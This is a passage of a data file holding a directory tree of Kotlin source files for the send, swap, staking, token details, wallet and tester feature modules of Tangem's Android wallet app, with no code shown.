id,title,username,language,date,content
│   │   │   └── src
│   │   │       └── main
│   │   │           └── java
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── feature
│   │   │                           └── referral
│   │   │                               └── domain
│   │   │                                   ├── di
│   │   │                                   │   └── ReferralDomainModule.kt
│   │   │                                   ├── models
│   │   │                                   │   └── ReferralData.kt
│   │   │                                   ├── ReferralInteractorImpl.kt
│   │   │                                   ├── ReferralInteractor.kt
│   │   │                                   └── ReferralRepository.kt
│   │   └── presentation
│   │       ├── build.gradle.kts
│   │       └── src
│   │           └── main
│   │               └── java
│   │                   └── com
│   │                       └── tangem
│   │                           └── feature
│   │                               └── referral
│   │                                   ├── analytics
│   │                                   │   └── ReferralEvents.kt
│   │                                   ├── models
│   │                                   │   ├── DemoModeException.kt
│   │                                   │   └── ReferralStateHolder.kt
│   │                                   ├── ReferralFragment.kt
│   │                                   ├── router
│   │                                   │   └── ReferralRouter.kt
│   │                                   ├── ui
│   │                                   │   ├── AgreementBottomSheetContent.kt
│   │                                   │   ├── AgreementText.kt
│   │                                   │   ├── AwardItems.kt
│   │                                   │   ├── CornersToRound.kt
│   │                                   │   ├── NonParticipateBottomBlock.kt
│   │                                   │   ├── ParticipateBottomBlock.kt
│   │                                   │   ├── ReferralBottomSheet.kt
│   │                                   │   └── ReferralScreen.kt
│   │                                   └── viewmodels
│   │                                       └── ReferralViewModel.kt
│   ├── send
│   │   ├── api
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── kotlin
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── features
│   │   │                           └── send
│   │   │                               └── api
│   │   │                                   ├── featuretoggles
│   │   │                                   │   └── SendFeatureToggles.kt
│   │   │                                   └── navigation
│   │   │                                       └── SendRouter.kt
│   │   └── impl
│   │       ├── build.gradle.kts
│   │       └── src
│   │           └── main
│   │               ├── java
│   │               │   └── com
│   │               │       └── tangem
│   │               │           └── features
│   │               │               └── send
│   │               │                   └── impl
│   │               │                       ├── di
│   │               │                       │   ├── SendFeatureTogglesModule.kt
│   │               │                       │   └── SendRouterModule.kt
│   │               │                       ├── featuretoggles
│   │               │                       │   └── DefaultSendFeatureToggles.kt
│   │               │                       ├── navigation
│   │               │                       │   ├── DefaultSendRouter.kt
│   │               │                       │   └── InnerSendRouter.kt
│   │               │                       └── presentation
│   │               │                           ├── analytics
│   │               │                           │   ├── SendAnalyticEvents.kt
│   │               │                           │   └── utils
│   │               │                           │       └── SendScreenAnalyticSender.kt
│   │               │                           ├── domain
│   │               │                           │   ├── AvailableWallet.kt
│   │               │                           │   └── SendRecipientListContent.kt
│   │               │                           ├── SendFragment.kt
│   │               │                           ├── state
│   │               │                           │   ├── amount
│   │               │                           │   │   ├── AmountStateFactory.kt
│   │               │                           │   │   ├── AmountUtils.kt
│   │               │                           │   │   ├── SendAmountCurrencyConverter.kt
│   │               │                           │   │   ├── SendAmountPastedTriggerDismissConverter.kt
│   │               │                           │   │   ├── SendAmountReduceByConverter.kt
│   │               │                           │   │   ├── SendAmountReduceToConverter.kt
│   │               │                           │   │   ├── SendAmountSegmentedButtonsConfig.kt
│   │               │                           │   │   └── SendAmountStateConverter.kt
│   │               │                           │   ├── common
│   │               │                           │   │   └── SendSyncEditConverter.kt
│   │               │                           │   ├── confirm
│   │               │                           │   │   ├── SendConfirmStateConverter.kt
│   │               │                           │   │   └── SendNotificationFactory.kt
│   │               │                           │   ├── fee
│   │               │                           │   │   ├── custom
│   │               │                           │   │   │   ├── BitcoinCustomFeeConverter.kt
│   │               │                           │   │   │   ├── CustomFeeConverter.kt
│   │               │                           │   │   │   └── EthereumCustomFeeConverter.kt
│   │               │                           │   │   ├── FeeCalculation.kt
│   │               │                           │   │   ├── FeeConverter.kt
│   │               │                           │   │   ├── FeeNotificationFactory.kt
│   │               │                           │   │   ├── FeeSelectorState.kt
│   │               │                           │   │   ├── FeeStateFactory.kt
│   │               │                           │   │   ├── SendFeeCustomFieldConverter.kt
│   │               │                           │   │   └── SendFeeStateConverter.kt
│   │               │                           │   ├── fields
│   │               │                           │   │   ├── SendAmountFieldChangeConverter.kt
│   │               │                           │   │   ├── SendAmountFieldConverter.kt
│   │               │                           │   │   ├── SendAmountFieldMaxAmountConverter.kt
│   │               │                           │   │   └── SendTextField.kt
│   │               │                           │   ├── previewdata
│   │               │                           │   │   ├── AmountStatePreviewData.kt
│   │               │                           │   │   ├── ConfirmStatePreviewData.kt
│   │               │                           │   │   ├── FeeStatePreviewData.kt
│   │               │                           │   │   ├── RecipientStatePreviewData.kt
│   │               │                           │   │   ├── SendClickIntentsStub.kt
│   │               │                           │   │   └── SendStatesPreviewData.kt
│   │               │                           │   ├── recipient
│   │               │                           │   │   ├── RecipientSendFactory.kt
│   │               │                           │   │   ├── SendRecipientAddressFieldConverter.kt
│   │               │                           │   │   ├── SendRecipientHistoryListConverter.kt
│   │               │                           │   │   ├── SendRecipientMemoFieldConverter.kt
│   │               │                           │   │   ├── SendRecipientStateConverter.kt
│   │               │                           │   │   ├── SendRecipientWalletListConverter.kt
│   │               │                           │   │   └── utils
│   │               │                           │   │       └── RecentListUtils.kt
│   │               │                           │   ├── SendAlertState.kt
│   │               │                           │   ├── SendEvent.kt
│   │               │                           │   ├── SendEventStateFactory.kt
│   │               │                           │   ├── SendNotification.kt
│   │               │                           │   ├── SendStateFactory.kt
│   │               │                           │   ├── SendTransactionAlertConverter.kt
│   │               │                           │   ├── SendUiState.kt
│   │               │                           │   └── StateRouter.kt
│   │               │                           ├── ui
│   │               │                           │   ├── amount
│   │               │                           │   │   ├── AmountButtons.kt
│   │               │                           │   │   ├── AmountFieldContainer.kt
│   │               │                           │   │   ├── AmountField.kt
│   │               │                           │   │   └── SendAmountContent.kt
│   │               │                           │   ├── common
│   │               │                           │   │   ├── FooterContainer.kt
│   │               │                           │   │   └── Notifications.kt
│   │               │                           │   ├── fee
│   │               │                           │   │   ├── SendCustomFee.kt
│   │               │                           │   │   ├── SendSpeedAndFeeContent.kt
│   │               │                           │   │   ├── SendSpeedSelectorItem.kt
│   │               │                           │   │   └── SendSpeedSelector.kt
│   │               │                           │   ├── recipient
│   │               │                           │   │   ├── ListItemWithIcon.kt
│   │               │                           │   │   ├── SendRecipientContent.kt
│   │               │                           │   │   └── TextFieldWithPaste.kt
│   │               │                           │   ├── send
│   │               │                           │   │   ├── AmountBlock.kt
│   │               │                           │   │   ├── FeeBlock.kt
│   │               │                           │   │   ├── RecipientBlock.kt
│   │               │                           │   │   └── SendContent.kt
│   │               │                           │   ├── SendEventEffect.kt
│   │               │                           │   ├── SendNavigationButtons.kt
│   │               │                           │   └── SendScreen.kt
│   │               │                           ├── utils
│   │               │                           │   └── FormatterUtils.kt
│   │               │                           └── viewmodel
│   │               │                               ├── SendClickIntents.kt
│   │               │                               └── SendViewModel.kt
│   │               └── res
│   │                   └── drawable
│   │                       └── send_hint_shape_12.xml
│   ├── staking
│   │   ├── api
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── kotlin
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── features
│   │   │                           └── staking
│   │   │                               └── api
│   │   │                                   ├── featuretoggles
│   │   │                                   │   └── StakingFeatureToggles.kt
│   │   │                                   └── navigation
│   │   │                                       └── StakingRouter.kt
│   │   └── impl
│   │       ├── build.gradle.kts
│   │       └── src
│   │           └── main
│   │               └── java
│   │                   └── com
│   │                       └── tangem
│   │                           └── features
│   │                               └── staking
│   │                                   └── impl
│   │                                       ├── di
│   │                                       │   ├── StakingFeatureTogglesModule.kt
│   │                                       │   └── StakingRouterModule.kt
│   │                                       ├── featuretoggles
│   │                                       │   └── DefaultStakingFeatureToggles.kt
│   │                                       └── navigation
│   │                                           ├── DefaultStakingRouter.kt
│   │                                           └── InnerStakingRouter.kt
│   ├── swap
│   │   ├── api
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── java
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── feature
│   │   │                           └── swap
│   │   │                               └── api
│   │   │                                   └── SwapFeatureToggleManager.kt
│   │   ├── data
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── java
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── feature
│   │   │                           └── swap
│   │   │                               ├── converters
│   │   │                               │   ├── ErrorsDataConverter.kt
│   │   │                               │   ├── ExchangeStatusConverter.kt
│   │   │                               │   ├── ExpressDataConverter.kt
│   │   │                               │   ├── LeastTokenInfoConverter.kt
│   │   │                               │   ├── RateTypeConverter.kt
│   │   │                               │   ├── SavedSwapTransactionListConverter.kt
│   │   │                               │   └── SwapPairInfoConverter.kt
│   │   │                               ├── DefaultSwapRepository.kt
│   │   │                               ├── DefaultSwapTransactionRepository.kt
│   │   │                               └── di
│   │   │                                   └── SwapDataModule.kt
│   │   ├── domain
│   │   │   ├── api
│   │   │   │   ├── build.gradle.kts
│   │   │   │   └── src
│   │   │   │       └── main
│   │   │   │           └── java
│   │   │   │               └── com
│   │   │   │                   └── tangem
│   │   │   │                       └── feature
│   │   │   │                           └── swap
│   │   │   │                               └── domain
│   │   │   │                                   └── api
│   │   │   │                                       └── SwapRepository.kt
│   │   │   ├── build.gradle.kts
│   │   │   ├── models
│   │   │   │   ├── build.gradle.kts
│   │   │   │   └── src
│   │   │   │       └── main
│   │   │   │           └── java
│   │   │   │               └── com
│   │   │   │                   └── tangem
│   │   │   │                       └── feature
│   │   │   │                           └── swap
│   │   │   │                               └── domain
│   │   │   │                                   └── models
│   │   │   │                                       ├── DataError.kt
│   │   │   │                                       ├── domain
│   │   │   │                                       │   ├── Currency.kt
│   │   │   │                                       │   ├── ExchangeQuote.kt
│   │   │   │                                       │   ├── ExchangeStatus.kt
│   │   │   │                                       │   ├── ExpressTransactionModel.kt
│   │   │   │                                       │   ├── LeastTokenInfo.kt
│   │   │   │                                       │   ├── NetworkInfo.kt
│   │   │   │                                       │   ├── PairsWithProviders.kt
│   │   │   │                                       │   ├── PermissionOptions.kt
│   │   │   │                                       │   ├── PreparedSwapConfigState.kt
│   │   │   │                                       │   ├── QuoteModel.kt
│   │   │   │                                       │   ├── SavedLastSwappedCryptoCurrency.kt
│   │   │   │                                       │   ├── SavedSwapTransactionListModel.kt
│   │   │   │                                       │   ├── SwapApproveType.kt
│   │   │   │                                       │   ├── SwapDataModel.kt
│   │   │   │                                       │   ├── SwapFeeState.kt
│   │   │   │                                       │   ├── SwapPairLeast.kt
│   │   │   │                                       │   ├── TransactionModel.kt
│   │   │   │                                       │   └── Warning.kt
│   │   │   │                                       ├── ExpressException.kt
│   │   │   │                                       ├── SwapAmount.kt
│   │   │   │                                       └── ui
│   │   │   │                                           ├── AmountFormatter.kt
│   │   │   │                                           ├── SwapState.kt
│   │   │   │                                           ├── SwapTransactionState.kt
│   │   │   │                                           ├── TokensDataStateExpress.kt
│   │   │   │                                           └── TokensDataState.kt
│   │   │   └── src
│   │   │       └── main
│   │   │           └── java
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── feature
│   │   │                           └── swap
│   │   │                               └── domain
│   │   │                                   ├── AllowPermissionsHandlerImpl.kt
│   │   │                                   ├── AllowPermissionsHandler.kt
│   │   │                                   ├── BlockchainInteractor.kt
│   │   │                                   ├── converters
│   │   │                                   │   └── SwapCurrencyConverter.kt
│   │   │                                   ├── DefaultBlockchainInteractor.kt
│   │   │                                   ├── DefaultInitialToCurrencyResolver.kt
│   │   │                                   ├── di
│   │   │                                   │   └── SwapDomainModule.kt
│   │   │                                   ├── InitialToCurrencyResolver.kt
│   │   │                                   ├── SwapInteractorImpl.kt
│   │   │                                   ├── SwapInteractor.kt
│   │   │                                   └── SwapTransactionRepository.kt
│   │   └── presentation
│   │       ├── build.gradle.kts
│   │       └── src
│   │           └── main
│   │               ├── java
│   │               │   └── com
│   │               │       └── tangem
│   │               │           └── feature
│   │               │               └── swap
│   │               │                   ├── analytics
│   │               │                   │   └── SwapEvents.kt
│   │               │                   ├── converters
│   │               │                   │   └── TokensDataConverter.kt
│   │               │                   ├── di
│   │               │                   │   ├── SwapFeatureTogglesManagerModule.kt
│   │               │                   │   └── SwapPresentationModule.kt
│   │               │                   ├── models
│   │               │                   │   ├── CurrenciesGroupWithFromCurrency.kt
│   │               │                   │   ├── states
│   │               │                   │   │   ├── ChooseFeeBottomSheetConfig.kt
│   │               │                   │   │   ├── ChooseProviderBottomSheetConfig.kt
│   │               │                   │   │   ├── FeeItemState.kt
│   │               │                   │   │   ├── GivePermissionBottomSheetConfig.kt
│   │               │                   │   │   ├── ProviderState.kt
│   │               │                   │   │   └── WebViewBottomSheetConfig.kt
│   │               │                   │   ├── SwapPermissionStateHolder.kt
│   │               │                   │   ├── SwapSelectTokenStateHolder.kt
│   │               │                   │   ├── SwapStateHolder.kt
│   │               │                   │   ├── SwapSuccessStateHolder.kt
│   │               │                   │   └── UiActions.kt
│   │               │                   ├── presentation
│   │               │                   │   └── SwapFragment.kt
│   │               │                   ├── router
│   │               │                   │   ├── CustomTabsManager.kt
│   │               │                   │   └── SwapRouter.kt
│   │               │                   ├── toggles
│   │               │                   │   ├── DefaultFeatureTogglesManager.kt
│   │               │                   │   └── InnerSwapFeatureTogglesManager.kt
│   │               │                   ├── ui
│   │               │                   │   ├── AutosizeTextField.kt
│   │               │                   │   ├── ChooseFeeBottomSheet.kt
│   │               │                   │   ├── ChooseProviderBottomSheet.kt
│   │               │                   │   ├── FeeItem.kt
│   │               │                   │   ├── ProviderItem.kt
│   │               │                   │   ├── StateBuilder.kt
│   │               │                   │   ├── SwapPermissionBottomSheet.kt
│   │               │                   │   ├── SwapScreenContent.kt
│   │               │                   │   ├── SwapScreen.kt
│   │               │                   │   ├── SwapSelectTokenScreen.kt
│   │               │                   │   ├── SwapSuccessScreen.kt
│   │               │                   │   ├── TransactionCard.kt
│   │               │                   │   └── WebViewBottomSheet.kt
│   │               │                   └── viewmodels
│   │               │                       ├── SwapProcessDataState.kt
│   │               │                       └── SwapViewModel.kt
│   │               └── res
│   │                   ├── drawable
│   │                   │   ├── ic_lightning_16.xml
│   │                   │   └── ill_one_inch_powered.webp
│   │                   └── drawable-night
│   │                       └── ill_one_inch_powered.webp
│   ├── tester
│   │   ├── api
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── java
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── features
│   │   │                           └── tester
│   │   │                               └── api
│   │   │                                   ├── AppRestarter.kt
│   │   │                                   └── TesterRouter.kt
│   │   └── impl
│   │       ├── build.gradle.kts
│   │       └── src
│   │           └── main
│   │               ├── AndroidManifest.xml
│   │               ├── java
│   │               │   └── com
│   │               │       └── tangem
│   │               │           └── feature
│   │               │               └── tester
│   │               │                   ├── ActivityClassWrapper.kt
│   │               │                   ├── apprestarter
│   │               │                   │   └── DefaultAppRestarter.kt
│   │               │                   ├── di
│   │               │                   │   ├── RestarterModule.kt
│   │               │                   │   └── TesterRouterModule.kt
│   │               │                   └── presentation
│   │               │                       ├── actions
│   │               │                       │   ├── TesterActionsContentState.kt
│   │               │                       │   ├── TesterActionsScreen.kt
│   │               │                       │   └── TesterActionsViewModel.kt
│   │               │                       ├── featuretoggles
│   │               │                       │   ├── models
│   │               │                       │   │   └── TesterFeatureToggle.kt
│   │               │                       │   ├── state
│   │               │                       │   │   └── FeatureTogglesContentState.kt
│   │               │                       │   ├── ui
│   │               │                       │   │   └── FeatureTogglesScreen.kt
│   │               │                       │   └── viewmodels
│   │               │                       │       └── FeatureTogglesViewModel.kt
│   │               │                       ├── menu
│   │               │                       │   ├── state
│   │               │                       │   │   └── TesterMenuContentState.kt
│   │               │                       │   └── ui
│   │               │                       │       └── TesterMenuScreen.kt
│   │               │                       ├── navigation
│   │               │                       │   ├── DefaultTesterRouter.kt
│   │               │                       │   ├── InnerTesterRouter.kt
│   │               │                       │   └── TesterScreen.kt
│   │               │                       └── TesterActivity.kt
│   │               └── res
│   │                   └── values
│   │                       └── strings.xml
│   ├── tokendetails
│   │   ├── api
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── kotlin
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── features
│   │   │                           └── tokendetails
│   │   │                               ├── featuretoggles
│   │   │                               │   └── TokenDetailsFeatureToggles.kt
│   │   │                               └── navigation
│   │   │                                   └── TokenDetailsRouter.kt
│   │   └── impl
│   │       ├── build.gradle.kts
│   │       └── src
│   │           └── main
│   │               └── kotlin
│   │                   └── com
│   │                       └── tangem
│   │                           └── feature
│   │                               └── tokendetails
│   │                                   ├── di
│   │                                   │   ├── TokenDetailsFeatureTogglesModule.kt
│   │                                   │   └── TokenDetailsRouterModule.kt
│   │                                   ├── featuretoggles
│   │                                   │   └── DefaultTokenDetailsFeatureToggles.kt
│   │                                   └── presentation
│   │                                       ├── router
│   │                                       │   ├── DefaultTokenDetailsRouter.kt
│   │                                       │   └── InnerTokenDetailsRouter.kt
│   │                                       ├── tokendetails
│   │                                       │   ├── analytics
│   │                                       │   │   ├── TokenDetailsAnalyticsEvent.kt
│   │                                       │   │   ├── TokenDetailsCurrencyStatusAnalyticsSender.kt
│   │                                       │   │   ├── TokenDetailsNotificationsAnalyticsSender.kt
│   │                                       │   │   └── utils
│   │                                       │   │       └── CryptoCurrencyMapper.kt
│   │                                       │   ├── state
│   │                                       │   │   ├── components
│   │                                       │   │   │   ├── ExchangeStatusNotifications.kt
│   │                                       │   │   │   ├── TokenDetailsActionButton.kt
│   │                                       │   │   │   ├── TokenDetailsDialogConfig.kt
│   │                                       │   │   │   ├── TokenDetailsNotification.kt
│   │                                       │   │   │   └── TokenDetailsPullToRefreshConfig.kt
│   │                                       │   │   ├── factory
│   │                                       │   │   │   ├── TokenDetailsActionButtonsConverter.kt
│   │                                       │   │   │   ├── TokenDetailsIconStateConverter.kt
│   │                                       │   │   │   ├── TokenDetailsLoadedBalanceConverter.kt
│   │                                       │   │   │   ├── TokenDetailsNotificationConverter.kt
│   │                                       │   │   │   ├── TokenDetailsRefreshStateConverter.kt
│   │                                       │   │   │   ├── TokenDetailsSkeletonStateConverter.kt
│   │                                       │   │   │   ├── TokenDetailsStateFactory.kt
│   │                                       │   │   │   ├── TokenDetailsSwapTransactionsStateConverter.kt
│   │                                       │   │   │   ├── TokenStakingStateConverter.kt
│   │                                       │   │   │   └── txhistory
│   │                                       │   │   │       ├── TokenDetailsLoadedTxHistoryConverter.kt
│   │                                       │   │   │       ├── TokenDetailsLoadingTxHistoryConverter.kt
│   │                                       │   │   │       ├── TokenDetailsTxHistoryItemFlowConverter.kt
│   │                                       │   │   │       └── TokenDetailsTxHistoryTransactionStateConverter.kt
│   │                                       │   │   ├── IconState.kt
│   │                                       │   │   ├── StakingBlockState.kt
│   │                                       │   │   ├── SwapTransactionsState.kt
│   │                                       │   │   ├── TokenDetailsAppBarMenuConfig.kt
│   │                                       │   │   ├── TokenDetailsBalanceBlockState.kt
│   │                                       │   │   ├── TokenDetailsState.kt
│   │                                       │   │   ├── TokenDetailsTopAppBarConfig.kt
│   │                                       │   │   └── TokenInfoBlockState.kt
│   │                                       │   ├── TokenDetailsPreviewData.kt
│   │                                       │   ├── ui
│   │                                       │   │   ├── components
│   │                                       │   │   │   ├── DropdownMenu.kt
│   │                                       │   │   │   ├── exchange
│   │                                       │   │   │   │   ├── ExchangeEstimate.kt
│   │                                       │   │   │   │   ├── ExchangeProvider.kt
│   │                                       │   │   │   │   ├── ExchangeStatusBlock.kt
│   │                                       │   │   │   │   ├── ExchangeStatusBottomSheet.kt
│   │                                       │   │   │   │   └── ExchangeStatusItems.kt
│   │                                       │   │   │   ├── TokenDetailsBalanceBlock.kt
│   │                                       │   │   │   ├── TokenDetailsDialogs.kt
│   │                                       │   │   │   ├── TokenDetailsTopAppBar.kt
│   │                                       │   │   │   ├── TokenIcon.kt
│   │                                       │   │   │   ├── TokenInfoBlock.kt
│   │                                       │   │   │   └── TokenStakingBlock.kt
│   │                                       │   │   └── TokenDetailsScreen.kt
│   │                                       │   └── viewmodels
│   │                                       │       ├── ExchangeStatusFactory.kt
│   │                                       │       ├── TokenDetailsClickIntents.kt
│   │                                       │       └── TokenDetailsViewModel.kt
│   │                                       └── TokenDetailsFragment.kt
│   └── wallet
│       ├── api
│       │   ├── build.gradle.kts
│       │   └── src
│       │       └── main
│       │           └── kotlin
│       │               └── com
│       │                   └── tangem
│       │                       └── features
│       │                           └── wallet
│       │                               └── navigation
│       │                                   └── WalletRouter.kt
│       └── impl
│           ├── build.gradle.kts
│           └── src
│               └── main
│                   ├── java
│                   │   └── com
│                   │       └── tangem
│                   │           └── feature
│                   │               └── wallet
│                   │                   ├── di
│                   │                   │   ├── FeatureTogglesModule.kt
│                   │                   │   └── WalletRouterModule.kt
│                   │                   ├── featuretoggle
│                   │                   │   └── WalletFeatureToggles.kt
│                   │                   └── presentation
│                   │                       ├── common
│                   │                       │   ├── component
│                   │                       │   │   ├── NetworkGroupItem.kt
│                   │                       │   │   ├── token
│                   │                       │   │   │   ├── LockedRectangle.kt
│                   │                       │   │   │   ├── NonFiatContentBlock.kt
